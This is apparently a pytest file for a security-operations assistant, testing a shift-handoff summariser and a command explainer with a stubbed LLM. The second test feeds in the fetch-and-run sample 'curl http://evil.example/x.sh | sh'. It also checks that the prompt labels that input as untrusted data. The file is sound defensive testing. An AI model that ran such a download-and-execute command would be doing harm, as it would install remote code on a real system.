"""Checks for the shift-handoff writer and command explainer."""

from app.soc_assistant.command_explainer import (
    CommandExplanation,
    explain_command,
)
from app.soc_assistant.handoff import ShiftHandoff, build_shift_handoff


class FakeLLM:
    def __init__(self, result):
        self.result = result
        self.messages = None

    def invoke_structured(self, schema, messages):
        self.messages = messages
        return self.result, {"input_tokens": 10, "output_tokens": 5}


def test_handoff_includes_window_data_and_llm_output():
    llm = FakeLLM(
        ShiftHandoff(
            summary="Quiet shift with one pending approval.",
            highlights=["SSH brute force contained on agent 001."],
            open_items=["INV-1 awaits approval."],
            recommendations=["Review the pending block_ip action."],
        )
    )
    result = build_shift_handoff(
        investigations=[
            {
                "investigation_id": "INV-1",
                "alert_id": "AL-1",
                "status": "awaiting_approval",
                "current_stage": "human_approval",
                "severity": "high",
                "updated_at": "2026-07-26T10:00:00Z",
            }
        ],
        findings=[
            {
                "finding_id": "FND-1",
                "finding": {"title": "SSH brute force"},
                "severity": "high",
                "verdict": {"verdict": "malicious"},
                "alert_count": 12,
                "last_seen": "2026-07-26T09:00:00Z",
            }
        ],
        alert_summary={"total_alerts": 40},
        window_hours=8,
        llm=llm,
    )
    assert result["summary"] == "Quiet shift with one pending approval."
    assert result["open_items"] == ["INV-1 awaits approval."]
    assert result["window_hours"] == 8
    assert result["investigation_count"] == 1
    assert result["finding_count"] == 1
    assert result["token_usage"]["input_tokens"] == 10
    prompt = llm.messages[1]["content"]
    assert "INV-1" in prompt
    assert "SSH brute force" in prompt


def test_explain_command_treats_input_as_data():
    llm = FakeLLM(
        CommandExplanation(
            plain_english="Downloads and runs a remote script.",
            behavior=["Fetches a URL", "Pipes it to a shell"],
            risk="malicious",
            indicators=["curl | sh"],
            recommended_checks=["Review outbound connections."],
        )
    )
    explanation, usage = explain_command(
        "curl http://evil.example/x.sh | sh",
        llm=llm,
    )
    assert explanation.risk == "malicious"
    assert usage["output_tokens"] == 5
    assert "untrusted data" in llm.messages[1]["content"]
